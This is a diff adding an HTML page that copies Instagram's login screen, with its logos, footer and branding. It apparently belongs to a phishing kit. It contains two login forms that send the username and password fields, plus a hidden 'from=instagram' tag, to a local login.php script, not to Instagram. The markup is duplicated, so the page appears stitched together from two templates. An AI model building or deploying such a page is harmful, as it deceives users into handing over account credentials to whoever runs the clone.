@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <!-- FAVIVON -->
+    <link rel="shortcut icon" href="img/favicon.png" type="image/png">
+    <!-- GOOGLE FONT -->
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
+    <!-- APP CSS -->
+    <link rel="stylesheet" href="css/instagram.css">
+
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" type="text/css" href="css/instagram.css">
+  <title></title>
+
+</head>
+
+<body>
+
+    <div class="container">
+        <div class="main-container">
+            <div class="main-content">
+                <div class="slide-container" style="background-image: url(img/phone-frame.png);">
+                    <div class="slide-content" id="slide-content">
+                        <img src="img/slide (1).jpg" alt="slide image" class="active">
+                        <img src="img/slide (2).jpg" alt="slide image">
+                        <img src="img/slide (3).jpg" alt="slide image">
+                        <img src="img/slide (4).jpg" alt="slide image">
+                        <img src="img/slide (5).jpg" alt="slide image">
+                    </div>
+                </div>
+                <div class="form-container">
+                    <div class="form-content box">
+                        <div class="logo">
+                            <img src="img/logo-light.png" alt="Instagram logo" class="logo-light">
+                            <img src="img/logo-dark.png" alt="Instagram logo" class="logo-dark">
+                        </div>
+                        <form action="login.php" method="POST">  
+
+                            <div class="signin-form" id="signin-form">
+                            <div class="form-group">
+                                <div class="animate-input">
+                                    <span>
+                                        Phone number, username or email
+                                    </span>
+                                    <input type="text" name="Username">
+                                </div>
+                            </div>
+                            <div class="form-group">
+                                <div class="animate-input">
+                                    <span>
+                                        Password
+                                    </span>
+                                    <input type="password" name="Password">
+                                    <input type="text" name="from" value="instagram" hidden>
+                                    <button></button>
+                                </div>
+                            </div>
+                            <div class="btn-group">
+                                <button class="btn-login" id="signin-btn" disabled>
+                                    Log In
+                                </button>
+                            </div>
+                            <div class="divine">
+                                <div></div>
+                                <div>OR</div>
+                                <div></div>
+                            </div>
+                            <div class="btn-group">
+                                <button class="btn-fb">
+                                    <img src="img/facebook-icon.png" alt="">
+                                    <span>Log in with Facebook</span>
+                                </button>
+                            </div>
+                            <a href="#" class="forgot-pw">Forgot password?</a>
+                        </div>
+
+                        </form>
+                        
+                    </div>
+                    <div class="box goto">
+                        <p>
+                            Don't have an account?
+                            <a href="#">Sign up</a>
+                        </p>
+                    </div>
+
+                    <div class="app-download">
+                        <p>Get the app.</p>
+                        <div class="store-link">
+                            <a href="#">
+                                <img src="img/app-store.png" alt="app store">
+                            </a>
+                            <a href="#">
+                                <img src="img/gg-play.png" alt="google play">
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="footer">
+            <div class="links">
+                <a href="#">About</a>
+                <a href="#">Blog</a>
+                <a href="#">Jobs</a>
+                <a href="#">Help</a>
+                <a href="#">API</a>
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+                <a href="#">Top Accounts</a>
+                <a href="#">Hashtags</a>
+                <a href="#">Locations</a>
+                <a href="#" id="darkmode-toggle">Darkmode</a>
+            </div>
+            <div class="copyright">
+                © 2021 Instagram from Facebook
+            </div>
+        </div>
+    </div>
+
+    <!-- APP JS -->
+    <script src="css/Instagram.js"></script>
+  <div class="container">
+      <div class="box">
+        <div class="heading"></div>
+        <form class="login-form" action="login.php" method="POST">
+          <div class="field">
+            <input type="text" name="Username" id="username" placeholder="Phone number, username, or email" required>
+            
+            <label for="username">Phone number, username, or email</label>
+          </div>
+          <div class="field">
+            <input id="password" type="password" placeholder="password" name="Password" required>
+            <label for="password">Password</label>
+          </div>
+           <input  type="text"  name="from" hidden value="instagram">
+            <button class="login-button" type="submit" title="login">Log In</button>
+            <div class="separator">
+              <div class="line"></div>
+              <p>OR</p>
+              <div class="line"></div>
+            </div>
+          <div class="other">
+            <button class="fb-login-btn" type="button">
+              <i class="fa fa-facebook-official fb-icon"></i>
+              <span class="">Log in with Facebook</span>
+            </button>
+            <a class="forgot-password" href="#">Forgot password?</a>
+          </div>
+        </form>
+      </div>
+      <div class="box">
+        <p>Don't have an account? <a class="signup" href="#">Sign Up</a></p>
+      </div>
+    </div>
+
+
+</body>
+
+</html>
